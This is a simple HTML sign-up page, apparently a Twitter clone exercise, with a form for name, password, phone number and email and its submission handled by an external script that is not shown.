<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="index.css">
    <link rel="shortcut icon" href="https://abs.twimg.com/favicons/twitter.3.ico" type="image/x-icon">
</head>
<body>

    <div class="login-container">
        <img src="./Images/logo.svg" alt="" style="left: 355px;">
        <h2 style="color:black">Create an account</h2>
        <!-- <h2>Login</h2> -->
        <form id="loginForm">
            <div class="form-group">
                <!-- <label for="username">Username</label> -->
                <input type="text" id="username" name="username" required placeholder="Name"style="padding:15px;">
            </div>
            <div class="form-group">
                <!-- <label for="password">Password</label> -->
                <input type="password" id="password" name="password" required placeholder="Password" style="padding:15px; ">
            </div>
            <div class="form-group">
                <!-- <label for="username">Username</label> -->
                <input type="number" id="phoneNumber" name="phoneNumber" required placeholder="Phone Number"style="padding:15px;">
            </div>
            <div class="form-group">
                <!-- <label for="username">Username</label> -->
                <input type="email" id="email" name="email" required placeholder="Email"style="padding:15px;">
            </div>
            <div class="form-group">   
                <button type="submit" class="submit" style="border-radius: 30px;padding:15px;">Next</button>
            </div>
            <script src="script.js"></script>
        </form>
    </div>
</body>
</html>
